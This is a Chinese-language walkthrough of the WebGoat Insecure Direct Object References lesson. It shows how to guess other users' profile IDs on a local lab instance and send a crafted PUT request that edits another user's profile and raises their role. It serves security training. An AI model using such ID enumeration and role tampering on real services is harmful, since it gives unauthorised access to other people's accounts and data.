# Insecure Direct Object References

这里主要是介绍了 RestFul 框架在的知识和权限配置不合适的时候可能产生的安全问题。

## Task 2

就是按照说明登录一下即可。

## Task 3

要使用 Chrome 的开发者工具，查看隐藏的属性值 role 和 userId 。

## Task 4

这里是根据 Restful 的格式猜测个人属性可能的 url 。答案是：

```
http://127.0.0.1:8080/WebGoat/IDOR/profile/<userId>
```

## Task 5

### step1 读取他人数据
第一步给出了 Tom 的 userId 是 2342384。同理，通过猜测 id 来查找其他人的 profile 。
方法是 Get 。找到一个 userId 是 2342388 的用户。

### step2 修改他人数据

首先先将 Option 方法获取可用的 Method。 发现可用 PUT。
而后构造 Restful 的 payload。当格式是 raw 或者 xml 的时候，返回错误。使用 Json 负载是：

```
{"role":3, "color":"red", "size":"large", "name":"Buffalo Bill", "userId":2342388}
```

提示权限不够，将 role 修改为 1 即可。

最终的 request 是：

```
PUT /WebGoat/IDOR/profile/2342388 HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/json
cache-control: no-cache
Postman-Token: 0dbc9361-5779-45ea-85c2-806edffd6e1e
{"role":1, "color":"red", "size":"large", "name":"Buffalo Bill", "userId":2342388
```
